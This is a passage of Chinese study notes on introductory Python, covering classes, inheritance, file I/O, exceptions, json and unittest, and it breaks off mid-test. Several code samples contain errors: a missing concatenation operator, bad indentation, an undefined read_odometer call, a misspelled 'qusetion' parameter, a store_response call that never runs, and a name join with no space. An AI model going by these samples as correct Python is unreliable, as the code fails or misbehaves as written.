-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;一次模拟小狗的简单尝试&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name,age</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;初始化属性name和age&quot;&quot;&quot;</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sit</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;模拟小狗被命令时蹲下&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(self.name.title()+<span class="string">&quot; is now sitting.&quot;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">roll_over</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;模拟小狗被命令时打滚&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(self.name.title()+<span class="string">&quot; rolled over!&quot;</span>)</span><br></pre></td></tr></table></figure>
-<p>根据约定，在python中，首字母大写的名称指的是类。 * 方法__init__()
-&gt;
-类中的函数称为方法。<strong>init</strong>()是一个特殊的方法，每当你根据Dog类创建新实例时，Python都会自动运行它。在这个方法的名称中，开头和末尾各有两个下下划线，这是一种约定，旨在避免Python默认方法与普通方法发生名称冲突。</p>
-<blockquote>
-<p>我们将方法__init__()定义成了包含三个形参：self、name和age。在这个方法的定义中，形参self必不可少，还必须位于其他形参的前面。因为Python调用这个__init__()方法来创建Dog实例时，将自动传入实参self。每个与类相关联的方法调用都自动传递实参self，它是一个指向实例本身的引用，让示例能够访问类中的属性和方法。</p>
-</blockquote>
-<blockquote>
-<p>以self为前缀的变量都可供类中的所有方法使用，self.name =
-name获取存储在形参name中的值，并将其存储到变量name中，然后该变量被关联到当前创建的实例。self.age
-= age的作用与此类似。像这样可通过实例访问的变量称为属性</p>
-</blockquote>
-<blockquote>
-<p>Dog类还定义了另外两个方法：sit()和roll_over()由于这些方法不需要额外的信息，如名字或年龄，因此它们只有一个形参self</p>
-</blockquote>
-<h2 id="根据类创建实例">根据类创建实例</h2>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>():</span><br><span class="line">    --snip--</span><br><span class="line">my_dog = Dog(<span class="string">&#x27;whllie&#x27;</span>,<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;My dog&#x27;s name is &quot;</span>+my_dog.name.title()+<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;My dog is &quot;</span><span class="built_in">str</span>(my_dog.age)+<span class="string">&quot; years old.&quot;</span>)</span><br></pre></td></tr></table></figure>
-<ul>
-<li>访问属性<br />
-<code>my_dog.name</code></li>
-<li>调用方法<br />
-<code>my_dog.sit()</code><br />
-<code>my_dog.roll_over()</code></li>
-<li>给属性指定默认值<br />
-&gt;
-类中的每个属性都必须有初始值，哪怕这个值是0或空字符串。如设置默认值时，在方法__init__()内中鼎这种初始值是可行的；如果你对某个属性这样做了，就无需包含为它提供初始值的形参。
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Car</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,make,model,year</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;初始化描述汽车的属性&quot;&quot;&quot;</span></span><br><span class="line">         self.make = make</span><br><span class="line">         self.model = model</span><br><span class="line">         self.year = year</span><br><span class="line">         self.odometer_reading = <span class="number">0</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_descriptive_name</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;返回整洁的描述性信息&quot;&quot;&quot;</span></span><br><span class="line">        long_name = <span class="built_in">str</span>(self.year)+<span class="string">&#x27; &#x27;</span>+self.make+<span class="string">&#x27; &#x27;</span>+self.model</span><br><span class="line">        <span class="keyword">return</span> long_name.title()</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_odometer</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;打印一条指出汽车里程的消息&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;This car has &quot;</span>+<span class="built_in">str</span>(self.odometer_reading)+<span class="string">&quot;miles on it.&quot;</span>)</span><br><span class="line">my_new_car = Car(<span class="string">&#x27;audi&#x27;</span>,<span class="string">&#x27;a4&#x27;</span>,<span class="number">2016</span>)</span><br><span class="line"><span class="built_in">print</span>(my_new_car.get_descriptive_name())</span><br><span class="line">my_new_car.read_odometer()</span><br></pre></td></tr></table></figure></li>
-<li>修改属性的值
-<ul>
-<li>直接修改属性的值<br />
-<code>my_new_car.odometer_reading = 23</code></li>
-<li>通过方法修改属性的值 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Car</span>():</span><br><span class="line">    --snip--</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">update_odometer</span>(<span class="params">self,mileage</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;将里程表读数设置为指定的值&quot;&quot;&quot;</span></span><br><span class="line">        self.odometer_reading = mileage</span><br><span class="line">my_new_car.update_odometer(<span class="number">23</span>)</span><br></pre></td></tr></table></figure> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">update_odometer</span>(<span class="params">self,mileage</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    将里程表读数设置为指定的值</span></span><br><span class="line"><span class="string">    禁止将里程表读数往回调</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> mileage &gt;= self.odometer_reading:</span><br><span class="line">        self.odometer_reading = mileage</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;You can&#x27;t roll back an odometer!&quot;</span>)</span><br></pre></td></tr></table></figure></li>
-<li>通过方法对属性的值进行递增 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">increment_odometer</span>(<span class="params">self,miles</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;将里程表读数增加指定的量&quot;&quot;&quot;</span></span><br><span class="line">    self.odometer_reading += miles</span><br></pre></td></tr></table></figure></li>
-</ul></li>
-</ul>
-<h2 id="继承">继承</h2>
-<blockquote>
-<p>一个类继承另一个类时，它将自动获得另一个类的所有属性和方法；原有的类称为父类，而新类称为子类，子类继承了其父类的所有属性和方法，同时还可以定义自己的属性和方法。</p>
-</blockquote>
-<ul>
-<li><p>子类的方法__init__() <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Car</span>():</span><br><span class="line">    --snip--</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ElectricCar</span>(<span class="title class_ inherited__">Car</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;电动汽车的独特之处&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,make,model,year</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;初始化父类的属性&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">super</span>().__init__(make,model,year)</span><br><span class="line">my_tesla = ElectricCar(<span class="string">&#x27;tesla&#x27;</span>,<span class="string">&#x27;model s&#x27;</span>,<span class="number">2016</span>)</span><br><span class="line"><span class="built_in">print</span>(my_tesla.get_descriptive_name())</span><br></pre></td></tr></table></figure></p></li>
-<li><p>给子类定义属性和方法 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,make,model,year</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    电动汽车的独特之处</span></span><br><span class="line"><span class="string">    初始化父类的属性，再初始化电动汽车特有的属性</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">super</span>().__init__(make,model,year)</span><br><span class="line">    self.battery_size = <span class="number">70</span></span><br></pre></td></tr></table></figure></p></li>
-<li><p>重写父类的方法 &gt;
-可在子类中定义一个与要重写的父类方法同名的方法。这样python将不会考虑这个父类方法，而只关注你在子类中定义的相应方法</p></li>
-</ul>
-<h1 id="文件和异常">文件和异常</h1>
-<h2 id="读取整个文件">读取整个文件</h2>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;pi_digits.txt&#x27;</span>) <span class="keyword">as</span> file_object:</span><br><span class="line">    contents = file_object.read()</span><br><span class="line">    <span class="built_in">print</span>(contents)</span><br></pre></td></tr></table></figure>
-<ul>
-<li>open()接受一个参数：要打开的文件的名称。python在当前执行的文件所在的目录中查找指定的文件。函数open()返回一个表示文件的对象。</li>
-<li>关键字with在不再需要访问文件后将其关闭。也可以调用open()和close()来打开和关闭文件，但这样做时，如果程序存在bug，导致close()语句未执行，文件将不会关闭。</li>
-<li>方法read()
-读取这个文件的全部内容，并将其作为一个长长的字符串存储在变量contents中。<br />
-read()到达文件末尾时返回一个空字符串，而将这个空字符串显示出来时就是一个空行。要删除末尾的空行，可使用rstrip()</li>
-</ul>
-<h2 id="文件路径">文件路径</h2>
-<ul>
-<li>相对路径<br />
-<code>with open('text_files\filename.txt') as file_object:</code><br />
-<strong>在windows系统中，文件路径中使用反斜杠“”</strong><br />
-<strong>而在Linux中使用斜杠‘/’</strong></li>
-<li>绝对路径 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file_path = <span class="string">r&#x27;C:\Users\sfc9982\other_files\text_files\filename.txt&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file_path) <span class="keyword">as</span> file_object:</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h2 id="逐行读取">逐行读取</h2>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">filename = <span class="string">&#x27;pi_digits.txt&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename) <span class="keyword">as</span> file_object:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> file_object:</span><br><span class="line">        <span class="built_in">print</span>(line)</span><br></pre></td></tr></table></figure>
-<ul>
-<li>创建一个包含文件各行内容的列表 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">filename = <span class="string">&#x27;pi_digits.txt&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename) <span class="keyword">as</span> file_object:</span><br><span class="line">    lines = file_object.readlines()</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">    <span class="built_in">print</span>(line.rstrip())</span><br></pre></td></tr></table></figure> &gt;
-方法readline()从文件中读取每一行，并将其存储在一个列表中；该列表被存储到变量lines中；在with代码块外，依然可以使用这个变量。</li>
-</ul>
-<h2 id="写入文件">写入文件</h2>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">filename = <span class="string">&#x27;programming.txt&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file_object:</span><br><span class="line">    file_object.write(<span class="string">&quot;I love NSILAB.&quot;</span>)</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>在这个实例中，调用open()时提供了两个实参，第二个实参‘w’告诉python，我们要以<em>写入模式</em>打开这个文件。<br />
-打开文件时，可指定<em>读取模式</em>（‘r’）、<em>写入模式</em>（‘w’）、<em>附加模式</em>（‘a’）或让你能够读取和写入文件的模式（‘r+’）。如果你省略了模式实参，python将以默认的只读模式打开文件<br />
-如果你要写入的文件不存在，函数open()将自动创建它。然而，以写入（‘w’）模式打开文件时千万要小心，因为如果指定的文件已经存在，python将在返回文件对象前清空该文件。<br />
-如果你要给文件添加内容，而不是覆盖原有的内容，可以<em>附加模式</em>打开文件。你以附加模式打开文件时，python不会再返回文件对象前清空文件，而你写入到文件的行都将添加到文件末尾。如果指定的文件不存在，python将为你创建一个空文件。</p>
-</blockquote>
-<h2 id="异常">异常</h2>
-<blockquote>
-<p>每当发生让python不知所措的错误时，它都会创建一个异常对象。如果你编写了处理该异常的代码，程序将继续运行；如果你未对异常进行处理，程序将停止，并显示一个traceback，其中包含有关异常的报告。</p>
-</blockquote>
-<blockquote>
-<p>异常是使用try-except代码块处理的。try-except代码块让python执行指定的操作，同时告诉python发生异常时怎么办。</p>
-</blockquote>
-<ul>
-<li>处理ZeroDivisionError异常 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="number">5</span>/<span class="number">0</span>)</span><br></pre></td></tr></table></figure></li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="number">5</span>/<span class="number">0</span>)</span><br><span class="line"><span class="keyword">except</span> ZeroDivisionError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;You can&#x27;t divide by zero!&quot;</span>)</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    answer = <span class="built_in">int</span>(first_number) / <span class="built_in">int</span>(second_number)</span><br><span class="line"><span class="keyword">except</span> ZeroDivisionError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;You can&#x27;t divide by 0!&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(answer)</span><br></pre></td></tr></table></figure>
-<ul>
-<li>处理FileNotFoundError异常 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">filename = <span class="string">&#x27;alice.txt&#x27;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename) <span class="keyword">as</span> f_obj:</span><br><span class="line">        contents = f_obj.read()</span><br><span class="line"><span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">    msg = <span class="string">&quot;Sorry, the file &quot;</span> + filename+ <span class="string">&quot; does not exist.&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(msg) </span><br></pre></td></tr></table></figure></li>
-</ul>
-<h2 id="分析文本">分析文本</h2>
-<ul>
-<li>方法split()以空格为分隔符将字符串拆分成多个部分，并将这些部分都存储到一个列表中</li>
-</ul>
-<h2 id="使用多个文件">使用多个文件</h2>
-<blockquote>
-<p>python中有一个pass语句，可在代码块中使用它来让python说明都不要做</p>
-</blockquote>
-<h2 id="存储数据">存储数据</h2>
-<blockquote>
-<p>模块json让你能够将简单的python数据结构转储到文件中，并在程序再次运行时加载该文件中的数据。</p>
-</blockquote>
-<ul>
-<li>使用json.dump()和json.load() &gt;
-函数json.dump()接受两个实参：要存储的数据以及可用于存储数据的文件对象。
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line">numbers = [<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">13</span>]</span><br><span class="line">filename = <span class="string">&#x27;numbers.json&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f_obj:</span><br><span class="line">    json.dump(numbers,f_obj)</span><br></pre></td></tr></table></figure></li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line">filename = <span class="string">&#x27;numbers.json&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename) <span class="keyword">as</span> f_obj:</span><br><span class="line">    nunbers = json.load(f_obj)</span><br><span class="line"><span class="built_in">print</span>(nunbers)</span><br></pre></td></tr></table></figure>
-<ul>
-<li><p>保存和读取用户生成的数据 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line">username = <span class="built_in">input</span>(<span class="string">&quot;What is your name? &quot;</span>)</span><br><span class="line">filename = <span class="string">&#x27;username.json&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f_obj:</span><br><span class="line">    json.dump(username,f_obj)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;We&#x27;ll remember you when you come back,&quot;</span>+username+<span class="string">&quot;!&quot;</span>)</span><br></pre></td></tr></table></figure></p></li>
-<li><p>重构 &gt;
-将代码划分为一系列完成具体工作的函数。这样的过程被称为重构。重构让代码更清晰、更易于理解、更容易扩展。</p></li>
-</ul>
-<h1 id="测试代码">测试代码</h1>
-<p>name_function.py <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_formatted_name</span>(<span class="params">first,last</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Generate a neatly formatted full name.&quot;&quot;&quot;</span></span><br><span class="line">    full_name = first + <span class="string">&#x27;&#x27;</span> + last</span><br><span class="line">    <span class="keyword">return</span> full_name.title()</span><br></pre></td></tr></table></figure> * 单元测试和测试用例 &gt;
-python标准库中的模块unittest提供了代码测试工具。<em>单元测试</em>用于核实函数的某个方面没有问题；<em>测试用例</em>是一组单元测试，这些单元测试一起核实函数在各种情形下的行为都符合要求。<em>全覆盖式测试用例</em>包含一整套单元测试，涵盖了各种可能的函数使用方式。</p>
-<p>下面是一个只包含一个方法的测试用例，它检查函数get_formatted_name()在给定名和姓时能否正确的工作<br />
-test_name_function.py <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> unittest</span><br><span class="line"><span class="keyword">from</span> name_function <span class="keyword">import</span> get_formatted_name</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NamesTestCase</span>(unittest.TestCase):</span><br><span class="line">     <span class="string">&quot;&quot;&quot;测试name_function.py&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">test_first_last_name</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;&quot;能够正确地处理像Janis Joplin这样的姓名码？&quot;&quot;&quot;</span></span><br><span class="line">        formatted_name = get_formatted_name(<span class="string">&#x27;Janis&#x27;</span>,<span class="string">&#x27;joplin&#x27;</span>)</span><br><span class="line">        self.assertEqual(formatted_name, <span class="string">&#x27;Janis Joplin&#x27;</span>)</span><br><span class="line">unittest.main()</span><br></pre></td></tr></table></figure> &gt;
-首先，我们导入了模块unittest和要测试的函数get_formatted_name()。然后创建了一个名为NamesTestCase的类，用于包含一系列针对get_formatted_name()的单元测试。你可随便给这个类命名，但最好让它看起来与要测试的函数相关，并包含字样Test。这个类必须继承unittest.TestCase类，这样python才知道如何运行你编写的测试。</p>
-<blockquote>
-<p>我们运行test_name_function时，所有以test打头的方法都将自动运行。</p>
-</blockquote>
-<ul>
-<li><p>断言方法：<strong>assertEqual()</strong>
-用来核实得到的结果是否与期望的结果一致。</p></li>
-<li><p>添加新测试 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">--snip--</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_first_last_middle_name</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;能够正确地处理像Wolfgang Amadeus Mozart 这样的姓名吗？&quot;&quot;&quot;</span></span><br><span class="line">    formatted_name = get_formatted_name(<span class="string">&#x27;wolfgang&#x27;</span>,<span class="string">&#x27;mozart&#x27;</span>,<span class="string">&#x27;amadeus&#x27;</span>)</span><br><span class="line">    self.assertEqual(fortmatted_name,<span class="string">&#x27;Wolfgang Amadeus Mozart&#x27;</span>)</span><br><span class="line">unittest.main()</span><br></pre></td></tr></table></figure> &gt;
-方法名必须以test_打头，这样它才会在我们运行test_name_function.py时自动运行。</p></li>
-</ul>
-<h2 id="测试类">测试类</h2>
-<ul>
-<li>断言方法</li>
-</ul>
-<table>
-<thead>
-<tr class="header">
-<th>方法</th>
-<th>用途</th>
-</tr>
-</thead>
-<tbody>
-<tr class="odd">
-<td>assertEqual(a,b)</td>
-<td>核实a==b</td>
-</tr>
-<tr class="even">
-<td>assertNotEqual(a,b)</td>
-<td>核实a!=b</td>
-</tr>
-<tr class="odd">
-<td>assertTrue(x)</td>
-<td>核实x为True</td>
-</tr>
-<tr class="even">
-<td>assertFalse(x)</td>
-<td>核实x为False</td>
-</tr>
-<tr class="odd">
-<td>assertIn(item,iist)</td>
-<td>核实item在list中</td>
-</tr>
-<tr class="even">
-<td>assertNotIn(item,list)</td>
-<td>核实item不在list中</td>
-</tr>
-</tbody>
-</table>
-<p>survey.py <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AnonymousSurvey</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;收集匿名调查问卷的答案&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,qusetion</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;存储一个问题，并为存储答案做准备&quot;&quot;&quot;</span></span><br><span class="line">        self.question = question</span><br><span class="line">        self.responses = []</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">show_question</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;显示调查问卷&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(self.question)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">store_response</span>(<span class="params">self,new_response</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;存储单份调查答卷&quot;&quot;&quot;</span></span><br><span class="line">        self.responses.append(new_response)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">show_results</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;显示收集到的所有答卷&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Survey results:&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> response <span class="keyword">in</span> self.responses:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;-&#x27;</span> + response)</span><br></pre></td></tr></table></figure></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> survey <span class="keyword">import</span> AnonymousSurvey</span><br><span class="line"><span class="comment"># 定义一个问题，并创建一个表示调查的AnonymousSurvey对象</span></span><br><span class="line">question = <span class="string">&quot;What language did you first learn to speak?&quot;</span></span><br><span class="line">my_survey = AnonymousSurvey(question)</span><br><span class="line"><span class="comment"># 显示问题并存储答案</span></span><br><span class="line">my_survey.show_question()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter &#x27;q&#x27; at any time to quit.\n&quot;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    response = <span class="built_in">input</span>(<span class="string">&quot;Language: &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> response == <span class="string">&#x27;q&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        my_survey.store_response(response)</span><br><span class="line"><span class="comment"># 显示调查结果</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nThank you to everyone who praticipated in the survey!&quot;</span>)</span><br><span class="line">my_survey.show_results()</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> unittest</span><br><span class="line"><span class="keyword">from</span> survey <span class="keyword">import</span> AnonymousSurvey</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TestAnonymousSurvy</span>(unittest.TestCase):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;针对AnonymousSurvey类的测试&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">test_store_single_response</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;测试单个答案会被妥善地存储&quot;&quot;&quot;</span></span><br><span class="line">        question = <span class="string">&quot;What language did you first learn to speak?&quot;</span></span><br><span class="line">        my_survey = AnonymousSurvey(question)</span><br><span class="line">        my_survey.store_response(<span class="string">&#x27;English&#x27;</span>)</span><br><span class="line">        